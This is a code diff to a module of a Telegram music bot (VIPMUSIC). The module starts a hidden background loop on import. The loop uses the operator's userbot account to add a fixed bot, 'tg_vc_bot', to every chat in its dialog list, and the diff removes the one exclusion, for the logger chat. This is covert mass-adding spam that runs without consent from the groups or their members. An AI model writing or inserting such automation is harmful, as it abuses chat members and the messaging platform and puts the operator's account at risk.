@@ -1,9 +1,8 @@
 import asyncio
 import datetime
-from VIPMUSIC.utils.database import get_assistant
+from VIPMUSIC.utils.database import get_client
 from config import LOGGER_ID
 from VIPMUSIC import app
-import config
 
 AUTO_GCAST = True
 BOT_USERNAME = "tg_vc_bot"
@@ -12,11 +11,11 @@ ADD_INTERVAL = 8
 
 async def add_bot_to_chats():
     try:
-        userbot = await get_assistant(LOGGER_ID)
+        userbot = await get_client(1)
         bot = await userbot.get_users(BOT_USERNAME)
         async for dialog in userbot.get_dialogs():
-            if dialog.chat.id == LOGGER_ID:
-                continue
+            
+            
             try:
                 await userbot.add_chat_members(dialog.chat.id, bot.id)
                 print(f"Added bot to chat: {dialog.chat.title}")
@@ -28,7 +27,7 @@ async def add_bot_to_chats():
         print("Error:", e)
 
 
-async def continuous_addss():
+async def continuous_add():
     while True:
         if AUTO_GCAST:
             await add_bot_to_chats()
@@ -37,5 +36,4 @@ async def continuous_addss():
 
 
 if AUTO_GCAST:
-    asyncio.create_task(continuous_addss())
-    
+    asyncio.create_task(continuous_add())
